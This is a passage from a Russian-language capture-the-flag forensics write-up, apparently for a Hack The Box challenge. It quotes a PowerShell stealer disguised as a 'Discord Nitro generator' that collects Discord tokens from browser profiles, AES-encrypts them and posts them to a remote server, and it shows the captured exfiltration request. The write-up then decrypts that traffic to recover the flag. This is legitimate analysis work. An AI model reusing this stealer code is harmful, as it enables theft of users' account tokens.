    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}


    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

Write-Host "
______              ______ _                       _   _   _ _ _               _____  _____  _____   ___
|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
|  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/

                                                                                                         "
Write-Host "Generating Discord nitro keys! Please be patient..."

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"

$paths = @{
    'Google Chrome' = "$local\Google\Chrome\User Data\Default"
    'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
    'Opera' = "$roaming\Opera Software\Opera Stable"
    'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
}

$headers = @{
    'Content-Type' = 'application/json'
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
}

$allTokens = @()
foreach ($platform in $paths.Keys) {
    $currentPath = $paths[$platform]

    if (-not (Test-Path $currentPath -PathType Container)) {continue}

    $tokens = Steal -path $currentPath
    $allTokens += $tokens
}

$userInfos = @()
foreach ($token in $allTokens) {
    $userInfo = Get-DiscordUserInfo -Token $token
    if ($userInfo) {
        $userDetails = [PSCustomObject]@{
            ID = $userInfo.id
            Email = $userInfo.email
            GlobalName = $userInfo.global_name
            Token = $token
        }
        $userInfos += $userDetails
    }
}

$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
catch {}

Write-Host "Success! Discord Nitro Keys:"
$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
$keys | ForEach-Object { Write-Output $_ }
```

Теперь у нас есть несколько интересных сведений, давайте углубимся:

1. **$part1,** по-видимому, является закодированным сообщением Base64, поэтому нам придется его декодировать:

![[Pasted image 20240808090501.png]]

Мы замечаем первую часть флага в сценарии `$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"` . Расшифровка дает нам:

```bash 
base64 -d SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf 
HTB{fr33_N17r0G3n_3xp053d!_ 
```  

Бинго! Это дает нам первую часть флага. Давайте оставим ее в карманах.

2. Далее в скрипте мы также находим переменную **$AES_KEY** , которая также закодирована в Base64:

```bash
echo "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=" | base64 -d  
cWphrNTk9wgWZ93t19jayqnlaDuIeFKi
```

«Хотя расшифровка для раскрытия второй части флага оказалась не такой простой, как мы надеялись, в процессе мы получили ключ шифрования AES. Теперь нам следует рассмотреть возможность его использования для расшифровки некоторого шифротекста.

**_Подождите!_** Помните, у нас был второй файл с именем 'rj1893rj1joijdkajwda', содержащий непонятный блок текста? Если нет, то держите. 

У нас в трафике есть такой запрос:

```http
POST /rj1893rj1joijdkajwda HTTP/1.1
Content-Type: text/plain
User-Agent: Mozilla/5.0
Host: 192.168.116.135:8080
Content-Length: 728
Connection: Keep-Alive

bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.10.12
Date: Sat, 02 Mar 2024 18:12:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2
Connection: close

OK
```

Похоже, что код крадет учетные данные, шифрует их и отправляет на сервер http://192.168.116.135:8080/rj1893rj1joijdkajwda.

Хотя его декодирование с помощью обычных схем не дало многого, у меня есть подозрение, что нам может потребоваться расшифровать этот файл. Простыми словами, нам придется дешифровать и получить данные. 

Для расшифровки AES нам понадобится следующее:

- **AES-ключ**
- **Режим**
- **IV**

```
function Create-AesManagedObject($key, $IV, $mode) 
```

**Cipher Block Chaining (CBC)** является одним из наиболее часто используемых режимов AES из-за его использования в TLS. CBC использует случайный вектор инициализации (IV), чтобы гарантировать создание различных шифротекстов, даже если один и тот же открытый текст кодируется несколько раз ( _источник_ : _Wikipedia.org_ ).

![[Pasted image 20240808091556.png]]

Поскольку IV был сгенерирован случайным образом, я слишком много думал об этой части уравнения и искал его везде в захвате пакетов и скрипте PowerShell. В конце концов, я остановился на значении IV по умолчанию из всех нулей (16 байт) после первого декодирования зашифрованного текста из Base64. Кажется, это сработало!

> Главный урок для будущего Maverick — будьте проще!

Вот как выглядит наш рецепт CyberChef сейчас. Конечно, вы можете использовать другие AES Online Decryptors, если вам это нравится :)

![[Pasted image 20240808091629.png]]

Фантастика! Мы уже куда-то движемся. Значение Email кажется достаточно странным и не соответствует GlobalName, которое является строкой. При осмотре оказалось, что оно закодировано с помощью схемы Base64. Ура HTB! Надеюсь, это последний обруч, через который нужно перепрыгнуть.

Давайте расшифруем значение «Email»:

```bash
echo  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9" | base64 -d   
b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

И вуаля! У нас есть вторая часть флага. Неплохой маленький челлендж, да?

```
Флаг: HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

**Walkthrough using python**

Мы можем использовать языки программирования, онлайн сервис для дешифровки или используйте любой другой удобный для вас способ дешифровки.

Для этого мы используем Python:

```python
from base64 import b64decode
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def decrypt_string(key, encrypted_data):
    aes_key = b64decode(key)
    encrypted_data = b64decode(encrypted_data)
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()

    return decrypted_data.decode('utf-8')

# Replace AES_KEY and encrypted_data with the actual values
AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
encrypted_data = "bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA=="

decrypted_data = decrypt_string(AES_KEY, encrypted_data)
print(decrypted_data)
```

Запуск этого дает нам кредиты:

```
python3 crack.py
[
    {
        "ID":  "1212103240066535494",
        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",
        "GlobalName":  "phreaks_admin",
        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"
    },
    {
        "ID":  "1212103240066535494",
        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",
        "GlobalName":  "phreaks_admin",
        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"
    }
]
```

Расшифровка электронного письма дает нам вторую часть флага:

```
base64 -d
YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9
b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

Объединив обе части, мы получаем флаг.

```
HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

**Дешифровка с п.м. онлайн сервиса**

После многократного прочтения и понимания сценария `/freediscordnitro` я понял, что он берет информацию о пользователе из браузера, а затем шифрует ее с помощью AES. У нас будет зашифрованный AES текст, и я также понял, что у нас есть некоторые особые вещи:

1. $Part1 → первая часть флага
2. $AES_KEY,размер AES_KEY
3. Зашифрованные_данные

Итак, у нас есть зашифрованные данные в файле text_plain, которые мы получили из pcap и сохранили их.

Теперь нам просто нужно преобразовать и расшифровать AES.

Инструмент, который я использовал:

![[Pasted image 20240808103019.png]]

У нас есть текст в кодировке base64, но я преобразую его через Cyber ​​Chef.


![[Pasted image 20240808103031.png]]

Хорошо, отправьте по электронной почте тот же Base64 еще раз. И снова CyberChef

![[Pasted image 20240808103044.png]]

У нас есть Флаг.










При извлечении zip-файла вызова нам предоставляется phreaky.pcap для анализа:

![[Pasted image 20240808064559.png]]

